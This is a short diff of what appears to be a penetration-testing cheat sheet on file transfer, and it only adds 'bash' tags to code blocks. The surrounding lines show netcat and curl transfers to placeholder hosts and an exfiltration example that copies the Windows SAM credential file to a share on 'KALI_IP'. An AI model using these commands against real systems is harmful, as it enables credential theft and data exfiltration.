@@ -7,7 +7,7 @@
 nc -nlvp [PORT] > [RECIVING.FILE]
 ```
 ##### send the file
-```
+```bash
 nc [IP] [PORT] < [SENDING.FILE]
 ```
 
@@ -17,7 +17,7 @@ nc [IP] [PORT] < [SENDING.FILE]
 curl -F "upload=@[FILE]" https://[IP]/[FILE]
 ```
 
-```
+```bash
 curl -o [FILE] https://[IP]/[FILE]
 ```
 
@@ -54,7 +54,7 @@ sudo impacket-smbserver [SHARE] .
 # to use for exfil: copy C:\Windows\Repair\SAM \\KALI_IP\share\sam.save
 ```
 ##### Upload from Target
-```
+```bash
 copy C:\Path\To\[FILE] \\[IP]\[SHARE]\[FILE]
 ```
 ##### Upload with curl to Target
